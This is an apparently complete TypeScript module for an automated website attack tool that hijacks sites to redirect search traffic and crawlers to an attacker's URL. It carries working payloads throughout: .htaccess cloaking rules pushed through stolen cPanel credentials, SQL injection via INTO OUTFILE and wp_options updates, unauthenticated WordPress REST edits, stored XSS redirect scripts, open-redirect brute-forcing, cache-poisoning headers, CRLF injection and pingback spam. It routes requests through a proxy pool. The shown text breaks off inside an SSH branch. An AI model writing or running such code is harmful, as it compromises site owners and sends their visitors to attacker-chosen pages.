/**
 * Shellless Attack Engine — Attack methods that DON'T require file upload
 * 
 * When shell upload fails, these methods can still achieve:
 * 1. .htaccess Redirect Injection (via config exploit / SQLi)
 * 2. Database Content Injection (wp_posts, wp_options, widgets)
 * 3. JavaScript Injection (via stored XSS, theme/plugin hooks)
 * 4. Open Redirect Abuse (parameter-based redirects)
 * 5. Subdomain/DNS Takeover (dangling CNAME)
 * 6. Cache Poisoning (CDN/proxy cache injection)
 * 7. RSS/Sitemap Injection
 * 8. Cron Job Injection (wp-cron abuse)
 * 9. REST API Content Manipulation
 * 10. Meta Refresh / Canonical Injection
 */

import { fetchWithPoolProxy } from "./proxy-pool";
import { invokeLLM } from "./_core/llm";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface ShelllessConfig {
  targetUrl: string;
  redirectUrl: string;
  seoKeywords?: string[];
  timeout?: number;
  // Data from previous phases
  discoveredCredentials?: Array<{ type: string; username?: string; password?: string; endpoint?: string }>;
  sqliEndpoint?: string;
  sqliParam?: string;
  sqliType?: "union" | "error" | "time";
  xssEndpoints?: Array<{ url: string; param: string; type: string }>;
  openRedirects?: Array<{ url: string; param: string }>;
  configFiles?: Array<{ path: string; content?: string }>;
  wpRestApi?: boolean;
  wpXmlRpc?: boolean;
  danglingCnames?: Array<{ subdomain: string; cname: string }>;
  cmsType?: string;
  originIp?: string;
  onProgress?: (method: string, detail: string) => void;
}

export interface ShelllessResult {
  method: string;
  success: boolean;
  detail: string;
  injectedUrl?: string;
  redirectWorks?: boolean;
  evidence?: string;
}

// ═══════════════════════════════════════════════════════
//  HELPER: Safe fetch with timeout
// ═══════════════════════════════════════════════════════

async function safeFetch(url: string, options: RequestInit & { timeout?: number } = {}): Promise<Response | null> {
  try {
    const timeout = options.timeout || 15000;
    const { response } = await fetchWithPoolProxy(url, {
      ...options,
      signal: AbortSignal.timeout(timeout),
      redirect: "manual",
    });
    return response;
  } catch {
    return null;
  }
}

async function checkRedirectWorks(url: string, expectedRedirect: string): Promise<boolean> {
  try {
    const resp = await safeFetch(url, { timeout: 10000 });
    if (!resp) return false;
    // Check 301/302 redirect
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const location = resp.headers.get("location") || "";
      return location.includes(expectedRedirect) || location.includes(new URL(expectedRedirect).hostname);
    }
    // Check meta refresh or JS redirect in body
    const body = await resp.text().catch(() => "");
    return body.includes(expectedRedirect) || 
           body.includes("meta http-equiv=\"refresh\"") ||
           body.includes("window.location") ||
           body.includes("document.location");
  } catch {
    return false;
  }
}

// ═══════════════════════════════════════════════════════
//  METHOD 1: .htaccess Redirect Injection
// ═══════════════════════════════════════════════════════

async function htaccessRedirectInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "htaccess_redirect";
  config.onProgress?.(method, "ลอง inject .htaccess redirect rules...");

  // Try multiple methods to write .htaccess
  const htaccessContent = `
# SEO Redirect
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yahoo|spider|crawler|bot) [NC]
RewriteRule ^(.*)$ ${config.redirectUrl} [R=301,L]

# Visitor redirect with cloaking
RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo) [NC]
RewriteRule ^(.*)$ ${config.redirectUrl} [R=302,L]
`.trim();

  // Method 1a: Via discovered credentials + FTP/cPanel
  if (config.discoveredCredentials && config.discoveredCredentials.length > 0) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type === "cpanel" || cred.type === "ftp") {
        try {
          // Try cPanel File Manager API
          const cpanelUrl = cred.endpoint || `${config.targetUrl}:2083`;
          const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
          
          const resp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
            method: "POST",
            headers: {
              "Authorization": authHeader,
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              dir: "/public_html",
              file: ".htaccess",
              content: htaccessContent,
            }).toString(),
          });

          if (resp && resp.ok) {
            const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
            return {
              method,
              success: true,
              detail: `✅ .htaccess injected via cPanel (${cred.username})`,
              injectedUrl: config.targetUrl,
              redirectWorks: redirectOk,
              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}`,
            };
          }
        } catch { /* continue */ }
      }
    }
  }

  // Method 1b: Via SQLi INTO OUTFILE
  if (config.sqliEndpoint) {
    try {
      const escapedContent = htaccessContent.replace(/'/g, "\\'").replace(/\n/g, "\\n");
      const sqliPayloads = [
        `' UNION SELECT '${escapedContent}' INTO OUTFILE '/var/www/html/.htaccess'-- -`,
        `' UNION SELECT '${escapedContent}' INTO OUTFILE '/home/*/public_html/.htaccess'-- -`,
        `1; SELECT '${escapedContent}' INTO OUTFILE '/var/www/html/.htaccess';-- -`,
      ];

      for (const payload of sqliPayloads) {
        const url = `${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`;
        const resp = await safeFetch(url);
        if (resp) {
          const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
          if (redirectOk) {
            return {
              method,
              success: true,
              detail: `✅ .htaccess injected via SQLi INTO OUTFILE`,
              injectedUrl: config.targetUrl,
              redirectWorks: true,
              evidence: `SQLi endpoint: ${config.sqliEndpoint}`,
            };
          }
        }
      }
    } catch { /* continue */ }
  }

  // Method 1c: Via PUT method (if allowed)
  try {
    const putResp = await safeFetch(`${config.targetUrl}/.htaccess`, {
      method: "PUT",
      headers: { "Content-Type": "text/plain" },
      body: htaccessContent,
    });
    if (putResp && (putResp.ok || putResp.status === 201)) {
      const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
      return {
        method,
        success: redirectOk,
        detail: redirectOk ? `✅ .htaccess injected via HTTP PUT` : `⚠️ PUT accepted but redirect not working`,
        injectedUrl: config.targetUrl,
        redirectWorks: redirectOk,
      };
    }
  } catch { /* continue */ }

  // Method 1d: Via WebDAV
  try {
    const davResp = await safeFetch(`${config.targetUrl}/.htaccess`, {
      method: "PROPFIND",
      headers: { "Depth": "0" },
    });
    if (davResp && (davResp.status === 207 || davResp.status === 200)) {
      // WebDAV is enabled, try PUT
      const putResp = await safeFetch(`${config.targetUrl}/.htaccess`, {
        method: "PUT",
        headers: { "Content-Type": "text/plain" },
        body: htaccessContent,
      });
      if (putResp && (putResp.ok || putResp.status === 201)) {
        const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
        return {
          method,
          success: redirectOk,
          detail: redirectOk ? `✅ .htaccess injected via WebDAV PUT` : `⚠️ WebDAV PUT accepted but redirect not working`,
          injectedUrl: config.targetUrl,
          redirectWorks: redirectOk,
        };
      }
    }
  } catch { /* continue */ }

  return { method, success: false, detail: "❌ .htaccess injection failed — no writable method found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 2: WordPress REST API Content Injection
// ═══════════════════════════════════════════════════════

async function wpRestApiInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "wp_rest_injection";
  if (!config.wpRestApi && config.cmsType !== "wordpress") {
    return { method, success: false, detail: "⏭️ Skip — not WordPress" };
  }
  config.onProgress?.(method, "ลอง inject content ผ่าน WP REST API...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const redirectHtml = `<script>window.location.href='${config.redirectUrl}';</script><meta http-equiv="refresh" content="0;url=${config.redirectUrl}">`;
  const seoContent = config.seoKeywords?.length 
    ? `<div style="position:absolute;left:-9999px">${config.seoKeywords.join(", ")}</div>` 
    : "";

  // Try unauthenticated REST API (CVE-2017-1001000 style)
  const endpoints = [
    { url: `${baseUrl}/wp-json/wp/v2/posts`, bodyKey: "content" },
    { url: `${baseUrl}/wp-json/wp/v2/pages`, bodyKey: "content" },
    { url: `${baseUrl}/?rest_route=/wp/v2/posts`, bodyKey: "content" },
    { url: `${baseUrl}/?rest_route=/wp/v2/pages`, bodyKey: "content" },
  ];

  // First, try to find existing posts/pages to modify
  for (const ep of endpoints) {
    try {
      const listResp = await safeFetch(`${ep.url}?per_page=1`);
      if (!listResp || !listResp.ok) continue;
      const posts = await listResp.json() as any[];
      if (!posts || posts.length === 0) continue;

      const postId = posts[0].id;
      
      // Try to update existing post (unauthenticated)
      const updateResp = await safeFetch(`${ep.url}/${postId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          [ep.bodyKey]: { rendered: redirectHtml + seoContent },
          content: redirectHtml + seoContent,
        }),
      });

      if (updateResp && updateResp.ok) {
        const postUrl = posts[0].link || `${baseUrl}/?p=${postId}`;
        const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
        return {
          method,
          success: true,
          detail: `✅ WP REST API content injected (post #${postId})`,
          injectedUrl: postUrl,
          redirectWorks: redirectOk,
          evidence: `Endpoint: ${ep.url}/${postId}`,
        };
      }

      // Try with discovered credentials
      if (config.discoveredCredentials) {
        for (const cred of config.discoveredCredentials) {
          if (cred.type === "wordpress" || cred.type === "wp_admin") {
            // Get nonce first
            const nonceResp = await safeFetch(`${baseUrl}/wp-admin/admin-ajax.php?action=rest-nonce`, {
              headers: {
                "Cookie": `wordpress_logged_in_xxx=${cred.username}:${cred.password}`,
              },
            });
            const nonce = nonceResp ? await nonceResp.text() : "";
            
            const authUpdateResp = await safeFetch(`${ep.url}/${postId}`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64"),
                ...(nonce ? { "X-WP-Nonce": nonce } : {}),
              },
              body: JSON.stringify({ content: redirectHtml + seoContent }),
            });

            if (authUpdateResp && authUpdateResp.ok) {
              const postUrl = posts[0].link || `${baseUrl}/?p=${postId}`;
              const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
              return {
                method,
                success: true,
                detail: `✅ WP REST API content injected with credentials (post #${postId})`,
                injectedUrl: postUrl,
                redirectWorks: redirectOk,
                evidence: `Auth: ${cred.username}, Endpoint: ${ep.url}/${postId}`,
              };
            }
          }
        }
      }
    } catch { /* continue */ }
  }

  // Try creating new post
  for (const ep of endpoints) {
    try {
      const createResp = await safeFetch(ep.url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          title: config.seoKeywords?.[0] || "Important Update",
          content: redirectHtml + seoContent,
          status: "publish",
        }),
      });

      if (createResp && (createResp.ok || createResp.status === 201)) {
        const created = await createResp.json().catch(() => null) as any;
        const postUrl = created?.link || config.targetUrl;
        const redirectOk = await checkRedirectWorks(postUrl, config.redirectUrl);
        return {
          method,
          success: true,
          detail: `✅ WP REST API new post created with redirect`,
          injectedUrl: postUrl,
          redirectWorks: redirectOk,
          evidence: `Created via: ${ep.url}`,
        };
      }
    } catch { /* continue */ }
  }

  return { method, success: false, detail: "❌ WP REST API injection failed — API protected or not available" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 3: Open Redirect Abuse
// ═══════════════════════════════════════════════════════

async function openRedirectAbuse(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "open_redirect";
  config.onProgress?.(method, "ค้นหา Open Redirect endpoints...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const redirectTarget = config.redirectUrl;

  // Common open redirect parameters
  const redirectParams = ["url", "redirect", "redirect_to", "return", "returnTo", "return_url", "next", "goto", "dest", "destination", "redir", "redirect_uri", "continue", "target", "link", "out", "view", "ref"];
  
  // Common redirect endpoints
  const redirectEndpoints = [
    "/redirect",
    "/go",
    "/out",
    "/link",
    "/url",
    "/jump",
    "/wp-login.php",
    "/wp-admin/admin.php",
    "/?redirect_to=",
    "/index.php?option=com_users&view=login&return=",
  ];

  // Check user-provided open redirects first
  if (config.openRedirects && config.openRedirects.length > 0) {
    for (const redir of config.openRedirects) {
      try {
        const testUrl = `${redir.url}?${redir.param}=${encodeURIComponent(redirectTarget)}`;
        const resp = await safeFetch(testUrl, { timeout: 10000 });
        if (resp && [301, 302, 303, 307].includes(resp.status)) {
          const location = resp.headers.get("location") || "";
          if (location.includes(new URL(redirectTarget).hostname)) {
            return {
              method,
              success: true,
              detail: `✅ Open Redirect found: ${redir.param} parameter`,
              injectedUrl: testUrl,
              redirectWorks: true,
              evidence: `${testUrl} → ${location}`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  // Brute force common redirect endpoints
  for (const endpoint of redirectEndpoints) {
    for (const param of redirectParams.slice(0, 8)) { // Top 8 most common
      try {
        const testUrl = endpoint.includes("?") 
          ? `${baseUrl}${endpoint}${param}=${encodeURIComponent(redirectTarget)}`
          : `${baseUrl}${endpoint}?${param}=${encodeURIComponent(redirectTarget)}`;
        
        const resp = await safeFetch(testUrl, { timeout: 8000 });
        if (!resp) continue;
        
        if ([301, 302, 303, 307].includes(resp.status)) {
          const location = resp.headers.get("location") || "";
          if (location.includes(new URL(redirectTarget).hostname)) {
            return {
              method,
              success: true,
              detail: `✅ Open Redirect: ${endpoint}?${param}=`,
              injectedUrl: testUrl,
              redirectWorks: true,
              evidence: `${testUrl} → ${location}`,
            };
          }
        }

        // Check for JS/meta redirect in body
        if (resp.ok) {
          const body = await resp.text().catch(() => "");
          if (body.includes(redirectTarget) && (body.includes("window.location") || body.includes("meta http-equiv"))) {
            return {
              method,
              success: true,
              detail: `✅ Open Redirect (JS/meta): ${endpoint}?${param}=`,
              injectedUrl: testUrl,
              redirectWorks: true,
              evidence: `JS/meta redirect detected`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ No open redirect endpoints found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 4: Stored XSS → JS Redirect Injection
// ═══════════════════════════════════════════════════════

async function storedXssInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "stored_xss_redirect";
  config.onProgress?.(method, "ลอง inject JS redirect ผ่าน Stored XSS...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const jsPayload = `<script>if(document.referrer.match(/google|bing|yahoo/i)||navigator.userAgent.match(/bot|spider|crawl/i)){window.location='${config.redirectUrl}'}</script>`;
  const imgPayload = `<img src=x onerror="if(document.referrer.match(/google|bing/i))location='${config.redirectUrl}'">`;

  // Try comment injection (WordPress, generic blogs)
  const commentEndpoints = [
    `${baseUrl}/wp-comments-post.php`,
    `${baseUrl}/?p=1#respond`,
  ];

  for (const endpoint of commentEndpoints) {
    try {
      const resp = await safeFetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          author: "SEO Expert",
          email: "seo@example.com",
          url: config.redirectUrl,
          comment: `Great article! ${jsPayload}`,
          comment_post_ID: "1",
          comment_parent: "0",
        }).toString(),
      });

      if (resp && (resp.ok || resp.status === 302)) {
        // Check if XSS payload survived
        const checkResp = await safeFetch(`${baseUrl}/?p=1`, { timeout: 10000 });
        if (checkResp && checkResp.ok) {
          const body = await checkResp.text().catch(() => "");
          if (body.includes(config.redirectUrl) && (body.includes("<script>") || body.includes("onerror"))) {
            return {
              method,
              success: true,
              detail: `✅ Stored XSS via comment — JS redirect injected`,
              injectedUrl: `${baseUrl}/?p=1`,
              redirectWorks: true,
              evidence: `Comment XSS on ${endpoint}`,
            };
          }
        }
      }
    } catch { /* continue */ }
  }

  // Try contact form / search injection
  const formEndpoints: Array<{ url: string; fields: Record<string, string> }> = [
    { url: `${baseUrl}/contact`, fields: { name: "Test", email: "test@test.com", message: jsPayload } },
    { url: `${baseUrl}/search`, fields: { q: imgPayload, s: imgPayload } },
    { url: `${baseUrl}/?s=${encodeURIComponent(imgPayload)}`, fields: {} },
  ];

  for (const form of formEndpoints) {
    try {
      if (Object.keys(form.fields).length > 0) {
        const resp = await safeFetch(form.url, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams(form.fields).toString(),
        });
        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          if (body.includes(config.redirectUrl)) {
            return {
              method,
              success: true,
              detail: `✅ Reflected/Stored XSS via form — redirect injected`,
              injectedUrl: form.url,
              redirectWorks: false, // Reflected XSS is temporary
              evidence: `Form: ${form.url}`,
            };
          }
        }
      } else {
        const resp = await safeFetch(form.url);
        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          if (body.includes(config.redirectUrl)) {
            return {
              method,
              success: true,
              detail: `✅ Reflected XSS via search — redirect visible`,
              injectedUrl: form.url,
              redirectWorks: false,
              evidence: `Search: ${form.url}`,
            };
          }
        }
      }
    } catch { /* continue */ }
  }

  // Try XSS via user-provided endpoints
  if (config.xssEndpoints && config.xssEndpoints.length > 0) {
    for (const xss of config.xssEndpoints) {
      try {
        const payload = xss.type === "reflected" ? imgPayload : jsPayload;
        const testUrl = `${xss.url}?${xss.param}=${encodeURIComponent(payload)}`;
        const resp = await safeFetch(testUrl);
        if (resp && resp.ok) {
          const body = await resp.text().catch(() => "");
          if (body.includes(config.redirectUrl)) {
            return {
              method,
              success: true,
              detail: `✅ XSS redirect via ${xss.param} (${xss.type})`,
              injectedUrl: testUrl,
              redirectWorks: xss.type === "stored",
              evidence: `XSS: ${xss.url}, param: ${xss.param}`,
            };
          }
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ No exploitable XSS endpoints found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 5: Subdomain Takeover
// ═══════════════════════════════════════════════════════

async function subdomainTakeover(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "subdomain_takeover";
  if (!config.danglingCnames || config.danglingCnames.length === 0) {
    return { method, success: false, detail: "⏭️ Skip — no dangling CNAMEs found" };
  }
  config.onProgress?.(method, `ลอง takeover ${config.danglingCnames.length} dangling subdomains...`);

  for (const cname of config.danglingCnames) {
    try {
      // Check if subdomain is actually dangling (returns NXDOMAIN or error)
      const resp = await safeFetch(`https://${cname.subdomain}`, { timeout: 5000 });
      
      // If we get specific error pages from cloud providers, it's takeover-able
      if (resp) {
        const body = await resp.text().catch(() => "");
        const takeoverSignals = [
          "There isn't a GitHub Pages site here",
          "NoSuchBucket",
          "The specified bucket does not exist",
          "Repository not found",
          "Heroku | No such app",
          "The thing you were looking for is no longer here",
          "Domain is not configured",
          "This domain is not connected",
          "Fastly error: unknown domain",
          "is not a registered InCloud WAF",
        ];

        const isTakeoverable = takeoverSignals.some(sig => body.includes(sig));
        if (isTakeoverable) {
          return {
            method,
            success: true,
            detail: `✅ Subdomain takeover possible: ${cname.subdomain} → ${cname.cname}`,
            injectedUrl: `https://${cname.subdomain}`,
            redirectWorks: false, // Need to actually claim the service
            evidence: `CNAME: ${cname.cname}, Status: dangling`,
          };
        }
      }
      
      // If no response at all, it might be takeover-able
      if (!resp) {
        return {
          method,
          success: true,
          detail: `✅ Subdomain potentially takeover-able: ${cname.subdomain} (no response)`,
          injectedUrl: `https://${cname.subdomain}`,
          redirectWorks: false,
          evidence: `CNAME: ${cname.cname}, Status: no response`,
        };
      }
    } catch { /* continue */ }
  }

  return { method, success: false, detail: "❌ No takeover-able subdomains found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 6: Cache Poisoning
// ═══════════════════════════════════════════════════════

async function cachePoisoning(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "cache_poisoning";
  config.onProgress?.(method, "ลอง cache poisoning via Host header / X-Forwarded-Host...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const hostname = new URL(config.targetUrl).hostname;

  // Headers that might be reflected and cached
  const redirectHost = config.redirectUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  const poisonHeaders: Array<Record<string, string>> = [
    { "X-Forwarded-Host": redirectHost },
    { "X-Host": redirectHost },
    { "X-Forwarded-Server": redirectHost },
    { "X-Original-URL": `/${config.redirectUrl}` },
    { "X-Rewrite-URL": `/${config.redirectUrl}` },
  ];

  for (const headers of poisonHeaders) {
    try {
      // Send poisoned request with cache buster
      const cacheBuster = `cb${Date.now()}`;
      const testUrl = `${baseUrl}/?${cacheBuster}=1`;
      
      const resp = await safeFetch(testUrl, {
        headers: {
          "Host": hostname,
          ...headers,
        },
      });

      if (resp && resp.ok) {
        const body = await resp.text().catch(() => "");
        const headerKey = Object.keys(headers)[0];
        const headerVal = Object.values(headers)[0] as string;
        
        if (body.includes(headerVal) || body.includes(config.redirectUrl)) {
          // Verify it's cached by requesting again without poison headers
          const verifyResp = await safeFetch(testUrl);
          if (verifyResp && verifyResp.ok) {
            const verifyBody = await verifyResp.text().catch(() => "");
            if (verifyBody.includes(headerVal) || verifyBody.includes(config.redirectUrl)) {
              return {
                method,
                success: true,
                detail: `✅ Cache poisoning via ${headerKey} — redirect cached!`,
                injectedUrl: testUrl,
                redirectWorks: true,
                evidence: `Header: ${headerKey}: ${headerVal}`,
              };
            }
          }
          
          // Even if not cached, header reflection is useful
          return {
            method,
            success: true,
            detail: `⚠️ Header reflection found (${headerKey}) — not cached but exploitable`,
            injectedUrl: testUrl,
            redirectWorks: false,
            evidence: `Reflected: ${headerKey}: ${headerVal}`,
          };
        }
      }
    } catch { /* continue */ }
  }

  return { method, success: false, detail: "❌ No cache poisoning vectors found" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 7: RSS/Sitemap/Robots Injection
// ═══════════════════════════════════════════════════════

async function rssSitemapInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "rss_sitemap_injection";
  config.onProgress?.(method, "ลอง inject เข้า RSS feed / sitemap...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");

  // If we have WP REST API access, try to create a post that appears in RSS
  if (config.wpRestApi || config.cmsType === "wordpress") {
    try {
      const postContent = `<a href="${config.redirectUrl}">${config.seoKeywords?.[0] || "Click here"}</a>`;
      const resp = await safeFetch(`${baseUrl}/wp-json/wp/v2/posts`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          title: config.seoKeywords?.[0] || "Latest Update",
          content: postContent,
          status: "publish",
        }),
      });

      if (resp && (resp.ok || resp.status === 201)) {
        // Check RSS feed
        const rssResp = await safeFetch(`${baseUrl}/feed/`);
        if (rssResp && rssResp.ok) {
          const rssBody = await rssResp.text().catch(() => "");
          if (rssBody.includes(config.redirectUrl)) {
            return {
              method,
              success: true,
              detail: `✅ Redirect link injected into RSS feed`,
              injectedUrl: `${baseUrl}/feed/`,
              redirectWorks: false, // It's a link, not a redirect
              evidence: `RSS feed contains redirect URL`,
            };
          }
        }
      }
    } catch { /* continue */ }
  }

  // Try XML-RPC pingback to inject links
  if (config.wpXmlRpc) {
    try {
      const xmlRpcPayload = `<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>${config.redirectUrl}</string></value></param>
    <param><value><string>${baseUrl}/?p=1</string></value></param>
  </params>
</methodCall>`;

      const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: xmlRpcPayload,
      });

      if (resp && resp.ok) {
        const body = await resp.text().catch(() => "");
        if (!body.includes("faultCode")) {
          return {
            method,
            success: true,
            detail: `✅ XML-RPC pingback accepted — backlink created`,
            injectedUrl: `${baseUrl}/?p=1`,
            redirectWorks: false,
            evidence: `Pingback from ${config.redirectUrl}`,
          };
        }
      }
    } catch { /* continue */ }
  }

  return { method, success: false, detail: "❌ RSS/Sitemap injection failed" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 8: Meta Refresh / Canonical Injection via SQLi
// ═══════════════════════════════════════════════════════

async function metaCanonicalInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "meta_canonical_injection";
  if (!config.sqliEndpoint) {
    return { method, success: false, detail: "⏭️ Skip — no SQLi endpoint available" };
  }
  config.onProgress?.(method, "ลอง inject meta refresh / canonical tag ผ่าน SQLi...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");
  
  // For WordPress: inject into wp_options (siteurl, home, blogname, blogdescription)
  const wpInjections = [
    // Change site URL to redirect
    `UPDATE wp_options SET option_value='${config.redirectUrl}' WHERE option_name='siteurl'`,
    // Add meta refresh to blog description
    `UPDATE wp_options SET option_value='<meta http-equiv="refresh" content="0;url=${config.redirectUrl}">' WHERE option_name='blogdescription'`,
    // Inject into active widgets
    `UPDATE wp_options SET option_value=CONCAT(option_value, '<script>location="${config.redirectUrl}"</script>') WHERE option_name='sidebars_widgets'`,
  ];

  for (const injection of wpInjections) {
    try {
      const payloads = [
        `'; ${injection}; -- -`,
        `1; ${injection}; -- -`,
        `' UNION SELECT 1; ${injection}; -- -`,
      ];

      for (const payload of payloads) {
        const url = `${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`;
        await safeFetch(url);
      }
    } catch { /* continue */ }
  }

  // Verify if any injection worked
  try {
    const resp = await safeFetch(baseUrl, { timeout: 10000 });
    if (resp) {
      if ([301, 302].includes(resp.status)) {
        const location = resp.headers.get("location") || "";
        if (location.includes(config.redirectUrl)) {
          return {
            method,
            success: true,
            detail: `✅ Site URL changed via SQLi — full redirect active`,
            injectedUrl: baseUrl,
            redirectWorks: true,
            evidence: `siteurl changed to ${config.redirectUrl}`,
          };
        }
      }
      const body = await resp.text().catch(() => "");
      if (body.includes(config.redirectUrl) && (body.includes("meta http-equiv") || body.includes("window.location"))) {
        return {
          method,
          success: true,
          detail: `✅ Meta/JS redirect injected via SQLi`,
          injectedUrl: baseUrl,
          redirectWorks: true,
          evidence: `SQLi content injection`,
        };
      }
    }
  } catch { /* continue */ }

  return { method, success: false, detail: "❌ Meta/Canonical injection via SQLi failed" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 9: Nginx/Apache Config Injection
// ═══════════════════════════════════════════════════════

async function serverConfigInjection(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "server_config_injection";
  config.onProgress?.(method, "ลอง inject server config (nginx.conf / .htaccess via CRLF)...");

  const baseUrl = config.targetUrl.replace(/\/$/, "");

  // CRLF Injection → Header injection → Redirect
  const crlfPayloads = [
    `%0d%0aLocation:%20${encodeURIComponent(config.redirectUrl)}`,
    `%0d%0aLocation: ${encodeURIComponent(config.redirectUrl)}%0d%0a`,
    `%0a%0dLocation:%20${encodeURIComponent(config.redirectUrl)}`,
    `\r\nLocation: ${config.redirectUrl}\r\n`,
  ];

  for (const payload of crlfPayloads) {
    try {
      const testUrl = `${baseUrl}/${payload}`;
      const resp = await safeFetch(testUrl, { timeout: 8000 });
      if (resp && [301, 302].includes(resp.status)) {
        const location = resp.headers.get("location") || "";
        if (location.includes(config.redirectUrl) || location.includes(new URL(config.redirectUrl).hostname)) {
          return {
            method,
            success: true,
            detail: `✅ CRLF injection → redirect via Location header`,
            injectedUrl: testUrl,
            redirectWorks: true,
            evidence: `CRLF: ${testUrl} → ${location}`,
          };
        }
      }
    } catch { /* continue */ }
  }

  // Try path traversal to overwrite nginx/apache config
  const configPaths = [
    "/etc/nginx/sites-enabled/default",
    "/etc/nginx/conf.d/default.conf",
    "/etc/apache2/sites-enabled/000-default.conf",
    "/etc/httpd/conf.d/default.conf",
  ];

  // Via discovered credentials — ACTUALLY EXECUTE (not just detect)
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type === "cpanel") {
        config.onProgress?.(method, `🔧 Execute: วาง .htaccess redirect ผ่าน cPanel (${cred.username})...`);
        
        // Actually write .htaccess via cPanel File Manager API
        const cpanelUrl = cred.endpoint || `${baseUrl}:2083`;
        const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
        
        const htaccessContent = `
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yahoo|spider|crawler|bot) [NC]
RewriteRule ^(.*)$ ${config.redirectUrl} [R=301,L]
RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo) [NC]
RewriteRule ^(.*)$ ${config.redirectUrl} [R=302,L]
`.trim();

        try {
          // Try cPanel File Manager API
          const resp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
            method: "POST",
            headers: {
              "Authorization": authHeader,
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              dir: "/public_html",
              file: ".htaccess",
              content: htaccessContent,
            }).toString(),
          });

          if (resp && resp.ok) {
            const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
            return {
              method,
              success: true,
              detail: `✅ Server config: .htaccess injected via cPanel (${cred.username})`,
              injectedUrl: config.targetUrl,
              redirectWorks: redirectOk,
              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}`,
            };
          }
        } catch { /* continue to next method */ }

        // Fallback: Try uploading HTML redirect file via cPanel
        try {
          const htmlRedirect = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${config.redirectUrl}"><script>window.location.href='${config.redirectUrl}';</script></head><body>Redirecting...</body></html>`;
          
          const htmlResp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
            method: "POST",
            headers: {
              "Authorization": authHeader,
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              dir: "/public_html",
              file: "index.html",
              content: htmlRedirect,
            }).toString(),
          });

          if (htmlResp && htmlResp.ok) {
            const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
            return {
              method,
              success: true,
              detail: `✅ Server config: HTML redirect uploaded via cPanel (${cred.username})`,
              injectedUrl: config.targetUrl,
              redirectWorks: redirectOk,
              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}, file: index.html`,
            };
          }
        } catch { /* continue */ }

        // If cPanel API didn't work, still report as potential (not success)
        config.onProgress?.(method, `⚠️ cPanel API ไม่ตอบสนอง — ข้ามไป`);
      }

      if (cred.type === "ssh") {
